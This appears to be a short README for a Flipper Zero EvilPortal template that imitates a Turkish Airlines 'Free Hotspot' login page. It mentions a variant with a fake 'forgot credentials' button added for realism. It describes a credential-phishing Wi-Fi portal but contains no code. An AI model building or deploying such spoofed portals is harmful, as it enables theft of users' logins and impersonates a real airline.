# !!FOR EDUCATIONAL USES ONLY!!
This one **emulates a portal for a Turkish Airlines "Free Hotspot"** using EvilPortal on your Flipper Zero.

# I did not include a Turkish version of the portal as I do not speak the language. I want it done properly and not randomly with ChatGPT or DeepL. Feel free to translate it if you speak it, and of course make a PR.


The **HTML in the *"WithForgotCredentials"* file** contains a **"forgot credentials" button on the user side to make it look more realistic**. This button only shows a message inviting them to go on their provider's app if they forgot their login/password.
## Happy flippin'

